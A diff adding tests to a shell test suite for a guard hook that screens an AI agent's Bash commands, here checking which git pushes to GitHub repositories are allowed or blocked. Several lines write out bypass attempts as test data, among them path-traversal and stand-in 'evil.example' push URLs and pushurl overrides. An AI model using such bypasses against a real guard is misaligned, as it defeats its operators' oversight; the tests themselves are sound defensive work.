@@ -12,7 +12,7 @@ check() { # check <expect: block|allow> <command>
   local expect="$1" cmd="$2" rc
   printf '%s' "$(python3 -c '
 import json,sys
-print(json.dumps({"tool_name":"Bash","tool_input":{"command":sys.argv[1]}}))' "$cmd")" \
+print(json.dumps({"tool_name":"Bash","cwd":"/","tool_input":{"command":sys.argv[1]}}))' "$cmd")" \
     | python3 "$GUARD" >/dev/null 2>&1
   rc=$?
   local got="allow"; [ "$rc" = "2" ] && got="block"
@@ -86,6 +86,54 @@ check allow 'cat network/mapa/.env.example'
 check allow 'grep -n KEY nas/litellm/.env.sample'
 check allow "cat > network/mapa/.env.example <<'EOF'"
 check allow 'head .env.template'
+
+echo "== GitHub push: target resolved via git remotes (NON_MIRRORED_GITHUB allowlist) =="
+check_in() { # check_in <expect> <cwd> <command>
+  local expect="$1" dir="$2" cmd="$3" rc
+  python3 -c '
+import json,sys
+print(json.dumps({"tool_name":"Bash","cwd":sys.argv[2],"tool_input":{"command":sys.argv[1]}}))' "$cmd" "$dir" \
+    | python3 "$GUARD" >/dev/null 2>&1
+  rc=$?
+  local got="allow"; [ "$rc" = "2" ] && got="block"
+  if [ "$got" = "$expect" ]; then PASS=$((PASS+1)); else
+    FAIL=$((FAIL+1)); printf '  FAIL expected=%-5s got=%-5s : (in %s) %s\n' "$expect" "$got" "$dir" "$cmd"; fi
+}
+T="$(mktemp -d)"
+GITEA_WARA=ssh://git@gitea-ssh.mati-lab.online:30009/gooral/wara-portfolio.git
+GH=https://github.com
+git init -q "$T/client" && git -C "$T/client" remote add origin "$GITEA_WARA" \
+  && git -C "$T/client" remote add github "$GH/wargovsky/portfolio.git"
+git init -q "$T/moved" && git -C "$T/moved" remote add origin "$GH/wargovsky/portfolio.git" \
+  && git -C "$T/moved" remote add gitea "$GITEA_WARA"
+git init -q "$T/mirrored" && git -C "$T/mirrored" remote add origin "$GH/gOOrcio/mati-lab.git" \
+  && git -C "$T/mirrored" remote add gitea git@gitea-ssh.mati-lab.online:gooral/mati-lab.git
+git init -q "$T/thirdparty" && git -C "$T/thirdparty" remote add origin git@github.com:someone/else.git
+check_in allow "$T/client"     'git push github main'
+check_in allow "$T/client"     'git push -u github fix/x'
+check_in allow "$T/client"     'git push https://github.com/wargovsky/portfolio.git main'
+check_in allow "$T/client"     'git push origin main'
+check_in allow "$T/moved"      'git push origin main'
+check_in allow "$T/moved"      'git push'
+check_in block "$T/moved"      'git push --force origin main'
+check_in block "$T/client"     'git push https://github.com/gOOrcio/mati-lab.git main'
+check_in block "$T/mirrored"   'git push origin main'
+check_in block "$T/mirrored"   'git push'
+check_in block "/"             "cd $T/mirrored && git push origin main"
+check_in allow "$T/thirdparty" 'git push origin main'
+check_in allow "$T/client"     "git -C $T/client push github main"
+# bypass attempts (security review 2026-10-14): text rule must stay the floor
+check_in block "$T/client"     'git push --repo=https://github.com/gOOrcio/mati-lab.git'
+check_in block "$T/client"     'git push -o ci.skip github main'
+check_in block "$T/client"     'git -c remote.github.pushurl=x push github main'
+check_in block "$T/client"     'git push https://github.com/wargovsky/portfolio.git/../../gOOrcio/mati-lab.git main'
+check_in block "$T/client"     'git push https://evil.example/github.com/wargovsky/portfolio.git main'
+git -C "$T/client" remote add both "$GH/wargovsky/portfolio.git" \
+  && git -C "$T/client" remote set-url --add --push both "$GH/wargovsky/portfolio.git" \
+  && git -C "$T/client" remote set-url --add --push both "$GH/gOOrcio/mati-lab.git"
+check_in block "$T/client"     'git push both main'
+check_in block "$T/client"     'git push github main https://github.com/gOOrcio/mati-lab.git'
+rm -rf "$T"
 
 echo "== fail-open wrapper (python3 exits 2 on a missing file, which would"
 echo "   otherwise read as BLOCK and wedge every Bash call) =="
